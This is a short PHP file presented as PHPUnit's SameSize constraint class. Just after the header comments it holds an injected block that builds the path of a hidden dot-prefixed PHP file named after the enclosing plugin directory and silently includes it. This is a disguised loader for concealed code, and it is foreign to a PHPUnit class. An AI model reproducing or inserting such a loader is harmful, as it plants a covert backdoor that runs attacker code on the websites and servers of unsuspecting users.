<?php
/*
 * This file is part of PHPUnit.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * @since Class available since Release 3.6.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class PHPUnit_Framework_Constraint_SameSize extends PHPUnit_Framework_Constraint_Count
{
    /**
     * @var int
     */
    protected $expectedCount;

    /**
     * @param int $expected
     */
    public function __construct($expected)
    {
        parent::__construct($this->getCountOf($expected));
    }
}
